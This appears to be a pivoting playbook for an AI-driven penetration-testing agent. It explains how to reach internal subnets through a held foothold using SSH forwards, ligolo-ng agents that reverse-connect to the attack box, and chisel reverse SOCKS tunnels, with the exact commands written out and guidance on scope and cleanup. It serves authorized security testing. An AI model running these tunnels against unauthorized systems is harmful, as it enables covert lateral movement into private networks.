---
name: pivoting
summary: Reach an internal subnet or loopback-only service through a foothold — SSH forward, or a dropped tunnelling agent (ligolo-ng / chisel) from a non-SSH host
trigger: a foothold that fronts hosts/ports your attack box cannot reach directly
---

# Pivoting playbook

Retrieved methodology for reaching **internal-only** targets through a host you already
hold. A foothold routinely fronts services bound to its own loopback (a DB on
`127.0.0.1`, an admin panel) or a second, RFC1918 subnet the attack box has no route to.
Pivoting turns that foothold into a path. Stay in scope — only tunnel to subnets/hosts
inside the stated targets — keep it non-destructive, and record the tunnelling agent you
drop as an IOC.

**Look for the need first.** On the foothold, the signals that there's more network
behind it: RFC1918 addresses in `ip a` / `ipconfig` / the routing table, a second NIC,
services listening on `127.0.0.1` that nmap from Kali never saw, and internal hostnames or
IPs referenced in app configs, `/etc/hosts`, or DNS that you can't reach directly. Any of
those → there's a segment to pivot into; `queue_followup` the new subnet once it's reachable.

## Pick the mechanism by the access you hold

The selector is **what the foothold gives you**, not preference:

- **SSH reachable on the foothold → the `port_forward` tool.** The built-in path, and the
  first reach whenever sshd is exposed (Linux, or Windows OpenSSH) and you hold a
  key/password. `mode='local'` (-L) forwards one internal service to `127.0.0.1:<port>`;
  `mode='dynamic'` (-D) opens a SOCKS5 proxy to reach anything the foothold can. It runs in
  the background and is torn down at engagement end. No binary to drop — prefer it when SSH
  is available.
- **No SSH — a Windows/WinRM or RCE-only foothold → drop a tunnelling agent that
  reverse-connects to your box.** This is the case `port_forward` can't cover, and the
  reason to reach for **ligolo-ng** (preferred) or **chisel** (fallback). Both work by the
  foothold connecting *out* to a listener on the attack box, so they survive the egress
  filtering that blocks an inbound forward.

## ligolo-ng — preferred agent pivot

Its advantage over port-by-port forwarding: one route makes a **whole subnet** reachable by
its real IP, and every Kali tool then works unmodified — no proxychains, no per-service setup.

- **On the attack box, stand up the proxy and its interface once.** Start
  `ligolo-proxy -selfcert` (listens on `:11601` by default). Create the tun interface it
  routes through: `ip tuntap add user <you> mode tun ligolo` then `ip link set ligolo up`
  (needs root — you have sudo). look for: the proxy printing the listener address; that
  host:port is what the agent dials.
- **Land the agent on the foothold and point it home.** Host the agent binary with
  `oob_listener(action='host', …)`, pull it down through the exec primitive you already
  have, and run it back at the proxy: `agent -connect <kali-ip>:11601 -ignore-cert`. **Match
  the binary to the foothold's OS and architecture** — an x64 agent on an x86 host (or the
  Linux agent on Windows) simply never calls back; a wrong-arch binary is the usual reason a
  "connected" agent never appears, not a network block.
- **Select the session, read its subnets, add the route.** In the proxy console: `session`
  to pick the agent that just connected, `ifconfig` to see the networks the foothold sits on,
  then on Kali `ip route add <internal-subnet> dev ligolo`. Now aim any tool — `netexec`,
  `http_request`, `nmap_scan`, the protocol clients — straight at the internal IPs.
- **Need a port to come back the other way** (catch a reverse shell from a host deeper in,
  pull a file to the foothold) → add a ligolo `listener_add` on the agent that maps a port on
  the foothold to one on your box.
- **Verify before building on it.** From Kali, hit one *known* internal service by real IP
  (e.g. `netexec smb <internal-ip>`). look for: route present but connections hang → the
  agent's session isn't started/selected in the console, or the tun interface isn't up/routed.

## chisel — fallback when ligolo isn't available

Reverse SOCKS is the mode that works from an egress-restricted Windows foothold:

- **On the attack box:** `chisel server -p <port> --reverse --socks5`, bound to **`0.0.0.0`**,
  not loopback — the foothold must be able to reach the listener, so a server listening only
  on `127.0.0.1` is exactly why a reverse tunnel "won't bind" from the client's side.
- **On the foothold:** `chisel client <kali-ip>:<port> R:socks`. The **`R:`** (reverse) prefix
  is what makes the *foothold* dial out to you and expose its SOCKS proxy on your box — a
  forward tunnel would need an inbound port the foothold usually won't accept.
- Then point tools at the SOCKS proxy (proxychains, or a tool's own `--proxy`/`--socks`).

## Working through the pivot, then tearing it down

- **A SOCKS proxy** (port_forward dynamic, or chisel) → drive tools through it with
  proxychains or their native proxy flag. **A ligolo route** → tools work unmodified by real
  IP. Either way, once the segment is reachable, re-run enumeration against it and
  `queue_followup` the new hosts — a pivot's payoff is the fresh attack surface behind it.
- **Record and clean up.** `record_persistence` the dropped agent binary with the exact
  removal command. At the end, stop the proxy/agent, `ip route del` the route, and remove the
  tun interface — leave no tunnel or binary behind.
